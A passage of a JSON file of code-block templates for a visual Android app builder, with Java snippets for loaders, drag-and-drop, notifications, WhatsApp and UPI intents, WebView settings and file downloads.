ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tpublic static LoaderView generateLoaderView(String type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase \"ClassicSpinner\":\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase \"FishSpinner\":\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase \"LineSpinner\":\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase \"ThreePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FourPulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FivePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"Radar\":\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase \"TwinFishesSpinner\":\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase \"Worm\":\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase \"Whirlpool\":\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase \"PhoneWave\":\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase \"Sharingan\":\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class MKLoader extends View implements InvalidateListener {\n\t\t\t\tprivate int setLoaderType;\n\t\t\t\tprivate int setLoaderColor;\n\t\t\t\tprivate LoaderView loaderView;\n\n\t\t\t\tpublic MKLoader(Context context) {\n\t\t\t\t\tsuper(context);\n\t\t\t\t\tinitialize(context, null, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs) {\n\t\t\t\t\tsuper(context, attrs);\n\t\t\t\t\tinitialize(context, attrs, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\tsuper(context, attrs, defStyleAttr);\n\t\t\t\t\tinitialize(context, attrs, defStyleAttr);\n\t\t\t\t}\n\n\t\t\t\tprivate void initialize(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\t//TypedArray typedArray \u003d context.obtainStyledAttributes(attrs, R.styleable.MKLoader);\n\t\t\t\t\t//int loaderType \u003d typedArray.getInt(R.styleable.MKLoader_mk_type,-1);\n\t\t\t\t\t//int loaderType \u003d -1;\n\t\t\t\t\t//loaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t\t//loaderView.setColor(Color.parseColor(\"#ffffff\"));\n\t\t\t\t\t//loaderView.setColor(typedArray.getColor(R.styleable.MKLoader_mk_color, Color.parseColor(\"#ffffff\")));\n\t\t\t\t\t//typedArray.recycle();\n\t\t\t\t}\n\n\t\t\t\tpublic void setType(int _type) {\n\t\t\t\t\tthis.setLoaderType \u003d _type;\n\t\t\t\t\tloaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t}\n\t\t\t\tpublic void setColor(int _color) {\n\t\t\t\t\tthis.setLoaderColor \u003d _color;\n\t\t\t\t\tloaderView.setColor(setLoaderColor);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\t\t\tfinal int measuredWidth \u003d resolveSize(loaderView.getDesiredWidth(), widthMeasureSpec);\n\t\t\t\t\tfinal int measuredHeight \u003d resolveSize(loaderView.getDesiredHeight(), heightMeasureSpec);\n\n\t\t\t\t\tsetMeasuredDimension(measuredWidth, measuredHeight);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n\t\t\t\t\tsuper.onLayout(changed, left, top, right, bottom);\n\t\t\t\t\tloaderView.setSize(getWidth(), getHeight());\n\t\t\t\t\tloaderView.initializeObjects();\n\t\t\t\t\tloaderView.setUpAnimation();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDraw(android.graphics.Canvas canvas) {\n\t\t\t\t\tsuper.onDraw(canvas);\n\t\t\t\t\tloaderView.draw(canvas);\n\t\t\t\t}\n\n\t\t\t\t@Override public void reDraw() {\n\t\t\t\t\tinvalidate();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onAttachedToWindow() {\n\t\t\t\t\tsuper.onAttachedToWindow();\n\t\t\t\t\tif (loaderView !\u003d null \u0026\u0026 loaderView.isDetached()) {\n\t\t\t\t\t\tloaderView.setInvalidateListener(this);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDetachedFromWindow() {\n\t\t\t\t\tsuper.onDetachedFromWindow();\n\t\t\t\t\tif (loaderView !\u003d null) {\n\t\t\t\t\t\tloaderView.onDetach();\n\t\t\t\t\t}\n\t\t\t\t}","color":"#CAC319","name":"MKLoaderLibrary","typeName":"","palette":"59","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e %m.activity % %s.inputOnly MKLoaderLibrary \u003c\u003c\u003c\u003c"},{"code":"{final MKLoader ag \u003d new MKLoader(%2$s.this);\nag.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\nag.setType(%3$s); //0-11\nag.setColor(%4$s);\n%1$s.addView(ag);}","color":"#CAC319","name":"addMKLoader","typeName":"","palette":"59","type":" ","spec":"%m.view addMKLoader %m.activity type(0-11) %d  color %m.color"},{"code":"}public static class Dragger {\n    private View dragView;\n    private View[] targetViews;\n    private float dX, dY;\n    private int initXY[] \u003d new int[2];\n    private boolean isInitXy \u003d false;\n    private boolean eventSuccess \u003d false;\n    private DragEventListener dragEventListener;\n    private View view;\n    public Dragger(View dragView, View[] targetViews) {\n        this.dragView \u003d dragView;\n        this.targetViews \u003d targetViews;\n    }\n    public Dragger() {\n    }\n    public static Dragger create(){\n        return new Dragger();\n    }\n    public Dragger setDragView(View dragView) {\n        this.dragView \u003d dragView;\n        return this;\n    }\n    public Dragger setTargetViews(View[] targetViews) {\n        this.targetViews \u003d targetViews;\n        return this;\n    }\n    public Dragger setDragEventListener(DragEventListener dragEventListener) {\n        this.dragEventListener \u003d dragEventListener;\n        return this;\n    }\n    public void startDragging(){\n        if(dragView \u003d\u003d null){\n            return;\n        }\n        if(targetViews \u003d\u003d null){\n            return;\n        }\n        dragView.setOnTouchListener(new View.OnTouchListener() {\n            @Override\n            public boolean onTouch(View v, MotionEvent event) {\n                switch (event.getAction()) {\n                    case MotionEvent.ACTION_DOWN:\n                        dX \u003d dragView.getX() - event.getRawX();\n                        dY \u003d dragView.getY() - event.getRawY();\n                        if(!isInitXy) {\n                            dragView.getLocationInWindow(initXY);\n                            isInitXy \u003d true;\n                        }\n                        break;\n                    case MotionEvent.ACTION_MOVE:\n                        dragView.animate()\n                                .x(event.getRawX() + dX)\n                                .y(event.getRawY() + dY)\n                                .setDuration(0)\n                                .start();\n                        for(int i\u003d0;i\u003ctargetViews.length;i++) {\n                            if (isViewInBounds(targetViews[i], event.getRawX(), event.getRawY())) {\n                                Dragger.this.view \u003d targetViews[i];\n                                eventSuccess \u003d true;\n                                break;\n                            }\n                            else {\n                                eventSuccess \u003d false;\n                            }\n                        }\n                        break;\n                    case MotionEvent.ACTION_UP:\n                        if(!eventSuccess) {\n                            dragView.animate()\n                                    .x(initXY[0])\n                                    .y(initXY[1])\n                                    .setDuration(0)\n                                    .start();\n                        }else {\n                            if(dragEventListener !\u003d null)\n                                dragEventListener.onDragComplete(view);\n                        }\n                    default:\n                        return false;\n                }\n                return true;\n            }\n        });\n    }\n    private Rect rect \u003d new Rect();\n    private int[] location \u003d new int[2];\n    private boolean isViewInBounds(View target, float x, float y){\n        target.getDrawingRect(rect);\n        target.getLocationOnScreen(location);\n        rect.offset(location[0], location[1]);\n        return rect.contains((int) x, (int)y);\n    }\n    public interface DragEventListener{\n        public void onDragComplete(View targetView);\n    }\n","color":"#CAC319","name":"DraggerLibrary","typeName":"","palette":"60","type":" ","spec":"\u003e\u003e\u003e\u003e DraggerLibrary \u003c\u003c\u003c\u003c"},{"code":"Dragger.create().setDragView(%s)\n\t.setTargetViews(new View[]{%s})\n\t.setDragEventListener(new Dragger.DragEventListener() {\n\t@Override\n\tpublic void onDragComplete(View targetView) {\n%s\n\t}\n}).startDragging();","color":"#CAC319","name":"setDragView","typeName":"","palette":"60","type":"c","spec":"setDragView %m.view and setTargetViews%m.view  When onDragComplete"},{"code":"%s,%s","color":"#CAC319","name":"ViewAndView","typeName":"view","palette":"60","type":"p","spec":"%m.view and %m.view"},{"code":"targetView.equals(%s)","color":"#CAC319","name":"viewIsTargetView","typeName":"","palette":"60","type":"b","spec":"%m.view isTargetView"},{"code":"\t\t{final Activity activity \u003d %s.this;\n\t\tfinal Context context \u003d activity.getApplicationContext();\n\t\tfinal int notificationId \u003d %s;\n\t\tfinal String channelId \u003d %s;\n\t\tfinal String channelName \u003d %s;\n\t\t\n\t\tnew androidx.core.app.NotificationCompat.Builder(context, channelId){\n\t\t\t\n\t\t\t\n\t\t\tNotificationManager notificationManager \u003d (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);\n\t\t\tIntent intent335 \u003d new Intent();\n\t\t\t\t\t\t\t\t\t   public void create(){\n\n\t\t\t\t\t\t\t\t\t\t   intent335.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); \n\t\t\t\t\t\t\t\t\t\t   PendingIntent pendingIntent \u003d PendingIntent.getActivity(activity, 0, intent335, 0);\n\t\t\t\t\t\t\t\t\t\t   \n\t\t\t\t\t\t\t\t\t\t   if (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.O) {\n\t\t\t\t\t\t\t\t\t\t\t   NotificationChannel mChannel \u003d new NotificationChannel(\n\t\t\t\t\t\t\t\t\t\t\t\t   channelId, channelName, NotificationManager.IMPORTANCE_HIGH);\n\t\t\t\t\t\t\t\t\t\t\t   notificationManager.createNotificationChannel(mChannel);\n\t\t\t\t\t\t\t\t\t\t   }\n\t\t\t\t\t\t\t\t\t\n\n%s\n\n\t\t\t\t\t\t\t\t\t   }\n\n\t\t\t\t\t\t\t\t   }.create();}\n\t\t","color":"#8D75FF","name":"CreatePushNotification","typeName":"","palette":"61","type":"c","spec":"%m.activity CreatePushNotification id %d  channel id %s name %s"},{"code":"setSmallIcon(R.drawable.%s);","color":"#8D75FF","name":"pushNotificationSetSmallIcon","typeName":"","palette":"61","type":" ","spec":"pushNotification setSmallIcon %m.resource"},{"code":"setContentTitle(%s);","color":"#8D75FF","name":"pushNotificationSetTitle","typeName":"","palette":"61","type":" ","spec":"pushNotification setTitle %s"},{"code":"setContentText(%s);","color":"#8D75FF","name":"pushNotificationSetContentText","typeName":"","palette":"61","type":" ","spec":"pushNotification setContentText %s"},{"code":"\t\t\t\t\t\t\t\t\t\t   setAutoCancel(%s);","color":"#8D75FF","name":"pushNotificationSetAutoCancel","typeName":"","palette":"61","type":" ","spec":"pushNotification setAutoCancel %b"},{"code":"setOngoing(%s);","color":"#8D75FF","name":"pushNotificationSetOngoing","typeName":"","palette":"61","type":" ","spec":"pushNotification setOngoing %b"},{"code":"setColor(%s);","color":"#8D75FF","name":"pushNotificationSetColor","typeName":"","palette":"61","type":" ","spec":"pushNotification setColor %m.color"},{"code":"setTitleColor(%s);","color":"#8D75FF","name":"pushNotificationTitleSetColor","typeName":"","palette":"61","type":" ","spec":"pushNotification setTitleColor %m.color"},{"code":"setSound(android.net.Uri.parse(%s));","color":"#8D75FF","name":"pushNotificationSetSound","typeName":"","palette":"61","type":" ","spec":"pushNotification setSoundUri %s"},{"code":"setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT);","color":"#8D75FF","name":"pushNotificationSetPriorityDEFAULT","typeName":"","palette":"61","type":" ","spec":"pushNotification setPriorityDEFAULT"},{"code":"setLights(%s,%s,%s);","color":"#8D75FF","name":"pushNotificationSetLights","typeName":"","palette":"61","type":" ","spec":"pushNotification setLights color %m.color start ms %d stop ms %d"},{"code":"setContentView(R.layout.%s);","color":"#8D75FF","name":"pushNotificationSetContentView","typeName":"","palette":"61","type":" ","spec":"pushNotification setContentView %m.customViews"},{"code":"%s \u003d findViewById(R.id.%s);","color":"#8D75FF","name":"pushNotificationWidgetFindViewById","typeName":"","palette":"61","type":" ","spec":"%s.inputOnly findViewById %s.inputOnly"},{"code":"RemoteViews contentView \u003d new RemoteViews(getPackageName(), R.layout.%s);\nsetContent(contentView);","color":"#8D75FF","name":"pushNotificationSetContentRemoteView","typeName":"","palette":"61","type":" ","spec":"pushNotification setContentRemoteView %m.customViews"},{"code":"contentView.setOnClickPendingIntent(R.id.%2$s,pendingIntent%1$s);","color":"#8D75FF","name":"pushNotificationFVBSetOnClick","typeName":"pandingIntent","palette":"61","type":" ","spec":"%m.pandingIntent FVB id %s.inputOnly setOnClick "},{"code":"%1$s.putExtra(%2$s,%3$s);","color":"#8D75FF","name":"pushNotificationPandingIntentPutExtra","typeName":"intent","palette":"61","type":" ","spec":"%m.intent putExtra key %s value %s"},{"code":"%1$s.setClass(getApplicationContext(),%2$s.class);\r\n","color":"#8D75FF","name":"pushNotificationPandingIntentSetScreen","typeName":"intent","palette":"61","type":" ","spec":"%m.intent setScreen %m.activity"},{"code":"setContentIntent(pendingIntent);\t\t\t\t\t\t\t\t   setContentIntent(TaskStackBuilder.create(context)\n\t\t\t\t\t\t\t\t\t\t   .addNextIntent(intent335).getPendingIntent(0,PendingIntent.FLAG_UPDATE_CURRENT));\n\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t","color":"#8D75FF","name":"pushNotificationSetPendingIntent","typeName":"","palette":"61","type":" ","spec":"pushNotification setDefaultPandingIntent"},{"code":"Intent %1$s \u003d new Intent(%2$s.this, %3$s.class);\nPendingIntent pendingIntent%1$s \u003d PendingIntent.getActivity(%2$s.this, 0, %1$s, 0);\n%1$s.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | %1$s.FLAG_ACTIVITY_CLEAR_TASK);","color":"#8D75FF","name":"pushNotificationCustomPandingIntentCreate","typeName":"","palette":"61","type":" ","spec":"pushNotification createPandingIntent %s.inputOnly this %m.activity goto %m.activity"},{"code":"%s","color":"#8D75FF","name":"pushNotificationCustomPendingIntent","typeName":"pandingIntent","palette":"61","type":"p","spec":"pandingIntent %s.inputOnly"},{"code":"intent335","color":"#8D75FF","name":"pushNotificationPendingIntent","typeName":"Intent","palette":"61","type":"p","spec":"defaultPandingIntent"},{"code":"notificationManager.notify(notificationId, this.build());","color":"#8D75FF","name":"pushNotificationShow","typeName":"","palette":"61","type":"f","spec":"pushNotification Show"},{"code":"ImageView icon91\u003dnew ImageView(%1$s.this); icon91.setImageResource(R.drawable.%2$s);\nfinal FloatingActionButton fab91 \u003dnew FloatingActionButton.Builder(%1$s.this).setContentView(icon91).build();\nSubActionButton.Builder builder91 \u003dnew SubActionButton.Builder(%1$s.this);","color":"#2FAFFF","name":"CreateFabIconCFAM","typeName":"","palette":"62","type":" ","spec":"%m.activity CFAM CreateFloatingActionButton %m.resource "},{"code":"ImageView %2$sIcon\u003dnew ImageView(%1$s.this); \n%2$sIcon.setImageResource(R.drawable.%3$s);\n        SubActionButton %2$sBtn\u003dbuilder91.setContentView(%2$sIcon).build();","color":"#2FAFFF","name":"CFAMCreateItem","typeName":"","palette":"62","type":" ","spec":"%m.activity CFAM CreateMenuItem %s.inputOnly icon %m.resource"},{"code":"final FloatingActionMenu fam91 \u003dnew FloatingActionMenu.Builder(%1$s.this).addSubActionView(%2$sBtn).attachTo(fab91).build();","color":"#2FAFFF","name":"CFAMBuildMenu","typeName":"","palette":"62","type":" ","spec":"%m.activity CFAM Build  addItem %m.MenuItem"},{"code":"%sBtn.setOnClickListener(new View.OnClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onClick(View _view) {\n\t\t\t\t\t%s\n\nfam91.close(true);\n\t\t\t\t}\n\t\t\t});","color":"#2FAFFF","name":"FCAMOnItemOnClick","typeName":"","palette":"62","type":"c","spec":"FCAM when item %m.MenuItem onClick "},{"code":"%s","color":"#2FAFFF","name":"ActionMenuItem","typeName":"MenuItem","palette":"62","type":"p","spec":"MenuItem %s.inputOnly"},{"code":"%sBtn).addSubActionView(%s","color":"#2FAFFF","name":"ActionMenuItemAndMenuItem","typeName":"MenuItem","palette":"62","type":"p","spec":"MenuItem %m.MenuItem and MenuItem %m.MenuItem"},{"code":"Intent intent \u003d com.google.android.gms.common.AccountPicker.newChooseAccountIntent(null, null, new String[]{\"com.google\"}, false, null, null, null, null); startActivityForResult(intent, 94); \n","name":"Pick account","palette":"63","type":" ","spec":"Pick account"},{"code":"}; break; case 94: try { _acc(_data.getStringExtra(android.accounts.AccountManager.KEY_ACCOUNT_NAME).toString(), _data.getStringExtra(android.accounts.AccountManager.KEY_ACCOUNT_TYPE).toString()); } catch (Exception e) { }; if (false) {","name":"On Account Picked","palette":"63","type":" ","spec":"On Account Picked"},{"code":"%1$s.setAction(Intent.ACTION_VIEW);","name":"setintent","palette":"64","type":" ","spec":"%m.intent Whatsapp Api Initialization"},{"code":"%1$s.setData(Uri.parse(\"whatsapp://send?text\u003d%2$s\u0026phone\u003d%3$s%4$s\"));","name":"send sms","palette":"64","type":" ","spec":"%m.intent You Text Message %s.inputOnly Country Code %s.inputOnly Recever Number%d"},{"code":"startActivity(%1$s);","name":"Start sending","palette":"64","type":" ","spec":"%m.intent Start Sending"},{"code":"try {\n%1$s \u003d ((android.telephony.TelephonyManager) %3$s.this.getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso().toUpperCase();\n} catch(Exception e) {\n%1$s \u003d \"Not Found\";\n}\n%2$s.setText(%1$s);","color":"#2962FF","name":"country code","typeName":"","palette":"65","type":" ","spec":"Get Country Code setString %s setTextView %m.textview On%m.activity"},{"code":"String[] IndoDev \u003d new String[] {","name":"Create autocompletetextview","palette":"66","type":" ","spec":"Create autocompletetextview1"},{"code":"%1$s,","color":"#FFFF00BF","name":"Add Item","typeName":"","palette":"66","type":" ","spec":"Add Item%s"},{"code":"};\n\nArrayAdapter\u003cString\u003e %1$s \u003d new ArrayAdapter\u003cString\u003e(this, android.R.layout.simple_dropdown_item_1line, IndoDev);","name":"Adapter ","palette":"66","type":" ","spec":"Adapter%s"},{"code":"%1$s.setAdapter(%1$s);","name":"AutoCompleteTextView","palette":"66","type":" ","spec":"%m.AutoCompleteTextView Set adapter%s"},{"code":"final androidx.viewpager.widget.ViewPager %1$s \u003d new androidx.viewpager.widget.ViewPager(this);\r\n%1$s.setLayoutParams(new ViewGroup.LayoutParams( ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));\n//code downloaded from FutureStore","name":"add ViewPager on Layout","palette":"67","type":" ","spec":"Add ViewPager on this Activity%m.ViewPager"},{"code":"%1$s.setBackgroundColor(%2$s);","name":"setPage Background Color","palette":"67","type":" ","spec":"%m.ViewPager Linear SetBackground Color%m.color"},{"code":"MyPagerAdapter adapter \u003d new MyPagerAdapter();\r\n%2$s.setAdapter(adapter);\r\n%2$s.setCurrentItem(%1$s);","name":"setOnStart Position","palette":"67","type":" ","spec":"setOnStart Position%d on%m.ViewPager"},{"code":"%1$s.addView(%2$s);","name":"linear for viewpager","palette":"67","type":" ","spec":"%m.view Linear for viewPager%m.ViewPager"},{"code":"%1$s.addOnPageChangeListener(new androidx.viewpager.widget.ViewPager.OnPageChangeListener() { public void onPageSelected(int position) { \r\nView noview \u003d (View) %1$s.findViewWithTag(\"%2$s\" + %1$s.getCurrentItem());","name":"get Current Position","palette":"67","type":" ","spec":"%m.ViewPager getCurrentPosition with TAG%s.inputOnly"},{"code":"position \u003d\u003d %1$s","name":"Position to change small image/text","palette":"67","type":"b","spec":"if Position \u003d %d"},{"code":"_%1$s();","color":"#FF000000","name":"if moreBlock than","typeName":"","palette":"67","type":" ","spec":"if more block than add it %s.inputOnly"},{"code":"}\r\n@Override public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) { }\r\n@Override public void onPageScrollStateChanged(int state) { }\r\n});\r\n}\r\nprivate class MyPagerAdapter extends androidx.viewpager.widget.PagerAdapter {\r\npublic int getCount() {\r\nreturn %1$s;\r\n}\r\npublic Object instantiateItem(View collection, int position) {\r\nLayoutInflater inflater \u003d (LayoutInflater) collection.getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);\r\nint resId \u003d 0;\nswitch (position) {","name":"total ViewPager custom.xml","palette":"67","type":" ","spec":"total ViewPager customView %d"},{"code":"case %1$s:\r\nresId \u003d R.layout.%2$s;\r\nbreak;","name":"initiate CustomViews","palette":"67","type":" ","spec":"when View position \u003d%d setCustomView find by id%s.inputOnly"},{"code":"}\r\nView view \u003d inflater.inflate(resId, null);\r\n((androidx.viewpager.widget.ViewPager)collection).addView(view, 0);\r\nview.setTag(\"%1$s\" + position);\r\nreturn view;\r\n}\r\n@Override\r\npublic void destroyItem(View arg0, int arg1, Object arg2) {\r\n((androidx.viewpager.widget.ViewPager) arg0).removeView((View) arg2);\r\n}\r\n@Override\r\npublic boolean isViewFromObject(View arg0, Object arg1) {\r\nreturn arg0 \u003d\u003d ((View) arg1);\r\n}\r\n@Override\r\npublic Parcelable saveState() {\r\nreturn null;\r\n}\r\n//code by Debjit Baishnab","name":"ending block of viewPager","palette":"67","type":" ","spec":"add TAG (same)%s.inputOnly "},{"code":"%1$s intent \u003d new %1$s();","name":"UPI Payment","palette":"68","type":" ","spec":"%m.intent "},{"code":"upi://pay?pa\u003d%1$s\u0026pn\u003d%2$s\u0026tn\u003d%3$s\u0026am\u003d%4$s\u0026cu\u003d%5$s","name":"UPI payment intent","palette":"68","type":"s","spec":"Your UPI Id%s and application name%s Enter Payment Description%s amount%d country name%s"},{"code":"%1$s chooser \u003d %1$s.createChooser(intent, \"Only Bhim UPI\");","name":"Start Upi","palette":"68","type":" ","spec":"UPI Chooser%m.intent"},{"code":"if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.JELLY_BEAN)","name":"sdk","palette":"68","type":" ","spec":"UPI Int Sdk"},{"code":"{ startActivityForResult(chooser, 1, null); }","name":"up","palette":"68","type":" ","spec":"Start it"},{"code":"%1$s.setBorderColor(%2$s);","name":"CIV setBorderColor","palette":"69","type":" ","spec":"%m.CircleImageView setBorderColor %m.color"},{"code":"%1$s.setBorderOverlay(%2$s);","name":"CIV setBorderOverlay","palette":"69","type":" ","spec":"%m.CircleImageView setBorderOverlay %b"},{"code":"%1$s.setBorderWidth(%2$s);","name":"CIV setBorderWidth","palette":"69","type":" ","spec":"%m.CircleImageView setBorderWidth %d"},{"code":"%1$s.setCircleBackgroundColor(%2$s);","name":"CIV setCircleBackgroundColor","palette":"69","type":" ","spec":"%m.CircleImageView setCircleBackgroundColor %m.color"},{"code":"%1$s.setCircleBackgroundColorResource(R.drawable.%2$s);","name":"CIV setCircleBackgroundColorResource","palette":"69","type":" ","spec":"%m.CircleImageView setCircleBackgroundColorResource %m.resource_bg"},{"code":"%1$s.setDisableCircularTransformation(%2$s);","name":"CIV setDisableCircularTransformation","palette":"69","type":" ","spec":"%m.CircleImageView setDisableCircularTransformation %b"},{"code":"%1$s.setImageResource(R.drawable.%2$s);","name":"CIV setImageResource","palette":"69","type":" ","spec":"%m.CircleImageView setImageResource %m.resource_bg"},{"code":"%1$s.setImageURI(android.net.Uri.parse(%2$s));","name":"CIV setImageURI","palette":"69","type":" ","spec":"%m.CircleImageView setImageURI %s"},{"code":"%1$s.getSettings().setJavaScriptEnabled(%2$s);","name":"webview get Client","palette":"70","type":" ","spec":"%m.webview Enable JavaScript%b"},{"code":"%1$s.getSettings().setJavaScriptCanOpenWindowsAutomatically(%2$s);","name":"JavaScript Can Open Window","palette":"70","type":" ","spec":"%m.webview Can Open WindowAutomatically%b"},{"code":"%1$s.setWebViewClient(new WebViewClient());","name":"webview get Client","palette":"70","type":" ","spec":"%m.webview Enable Web Client"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(%2$s);","name":"webview Load with Overview","palette":"70","type":" ","spec":"%m.webview Load With OverView%b"},{"code":"%1$s.getSettings().setUseWideViewPort(%2$s);","name":"webview set wideVuew Port","palette":"70","type":" ","spec":"%m.webview Wide ViewPort %b"},{"code":"%1$s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {\nIntent intent \u003d new Intent(Intent.ACTION_VIEW);\nintent.setData(Uri.parse(url));\nstartActivity (intent);\n}\n});","name":"Download With Other App","palette":"70","type":" ","spec":"%m.webview download With Other App"},{"code":"%1$s.setDownloadListener(new DownloadListener() {\npublic void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {\nDownloadManager.Request request \u003d new DownloadManager.Request(Uri.parse(url));\nString cookies \u003d CookieManager.getInstance().getCookie(url);\nrequest.addRequestHeader(\"cookie\", cookies);\nrequest.addRequestHeader(\"User-Agent\", userAgent);\nrequest.setDescription(\"Downloading file...\");\nrequest.setTitle(URLUtil.guessFileName(url, contentDisposition, mimetype));\nrequest.allowScanningByMediaScanner(); request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\njava.io.File aatv \u003d new java.io.File(Environment.getExternalStorageDirectory().getPath() + \"/%2$s\");\nif(!aatv.exists()){if (!aatv.mkdirs()){ Log.e(\"TravellerLog ::\",\"Problem creating Image folder\");}} request.setDestinationInExternalPublicDir(\"/%2$s\", URLUtil.guessFileName(url, contentDisposition, mimetype));\nDownloadManager manager \u003d (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);\nmanager.enqueue(request);\nshowMessage(\"Downloading File....\");\n//Notif if success\nBroadcastReceiver onComplete \u003d new BroadcastReceiver() {\npublic void onReceive(Context ctxt, Intent intent) {\nshowMessage(\"Download Complete!\");\nunregisterReceiver(this);\n}};\nregisterReceiver(onComplete, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));\n}\n});","name":"Download In app With Notification","palette":"70","type":" ","spec":"%m.webview Download In App On Storage Path /%s.inputOnly"},{"code":"startActivity(new android.content.Intent(android.app.DownloadManager.ACTION_VIEW_DOWNLOADS));","name":"Open Download Folder","palette":"70","type":" ","spec":"Open Download Folder"},{"code":"%1$s.getSettings().setDisplayZoomControls(%2$s);","name":"Zoom With button","palette":"70","type":" ","spec":"%m.webview zoom with Button %b"},{"code":"%1$s.getSettings().setBuiltInZoomControls(%2$s);","name":"zoom with Finger","palette":"70","type":" ","spec":"%m.webview zoom with Finger %b"},{"code":"%1$s.setImageBitmap(%2$s.getFavicon());","name":"set Favicon","palette":"70","type":" ","spec":"%m.imageview set Image View To Favicon%m.webview"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true); %1$s.getSettings().setUseWideViewPort(true); final WebSettings webSettings \u003d %1$s.getSettings(); final String newUserAgent; newUserAgent \u003d \"Mozilla/5.0 (Android) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","name":"WebView Set Mobile","palette":"70","type":" ","spec":"%m.webview Set Mobile View"},{"code":"%1$s.getSettings().setLoadWithOverviewMode(true); %1$s.getSettings().setUseWideViewPort(true); final WebSettings webSettings \u003d %1$s.getSettings(); final String newUserAgent; newUserAgent \u003d \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"; webSettings.setUserAgentString(newUserAgent);","name":"WebView Set Desktop Mode","palette":"70","type":" ","spec":"%m.webview Set desktop Mode"},{"code":"%1$s.getSettings().setJavaScriptEnabled(%2$s);","name":"Java Script","palette":"70","type":" ","spec":"%m.webview JavaScript Enable%b"},{"code":"final int cx \u003d %1$s.getMeasuredWidth() / 2; final int cy \u003d %1$s.getMeasuredHeight() / 2;  final int finalRadius \u003d Math.max(%1$s.getWidth(), %1$s.getHeight()) / 2;\nfinal Animator anim \u003d  ViewAnimationUtils.createCircularReveal(%1$s, cx, cy, 0, finalRadius);  %1$s.setVisibility(View.VISIBLE);\nanim.start();","name":"Circuler Transection","palette":"71","type":" ","spec":"%m.view Convert this Linear As Circuler Translation When Revealed"},{"code":"LinearLayout viewgroup \u003d(LinearLayout) %1$s;\n\nandroid.transition.AutoTransition autoTransition \u003d new android.transition.AutoTransition(); autoTransition.setDuration((long)%2$s); android.transition.TransitionManager.beginDelayedTransition(viewgroup, autoTransition);","name":"translation Effect","palette":"71","type":" ","spec":"%m.view active Translation Effect for 